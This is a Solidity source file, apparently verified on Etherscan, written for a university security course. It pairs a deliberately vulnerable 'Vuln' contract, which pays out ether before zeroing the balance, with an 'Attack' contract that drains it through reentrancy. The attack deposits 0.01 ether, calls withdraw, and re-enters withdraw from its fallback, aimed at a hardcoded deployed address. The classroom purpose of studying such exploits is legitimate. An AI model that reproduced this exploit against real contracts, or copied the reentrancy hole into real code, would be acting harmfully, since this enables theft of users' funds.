/**
 *Submitted for verification at Etherscan.io on 2021-12-08
*/

pragma solidity ^0.6.0;
// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
// SPDX-License-Identifier: WTFPL
//
// Happy hacking, and play nice! :)
contract Vuln {
    mapping(address => uint256) public balances;
    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }
    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");
        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack {
    Vuln public vulnCon = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));

    int256 num = 0;
  

    function depo() public payable {
        vulnCon.deposit{ value: 0.01 ether }();
        vulnCon.withdraw();
    }

 fallback() external payable {
    while(num < 4){
            num+=1;
            vulnCon.withdraw();
        }
    }
    
}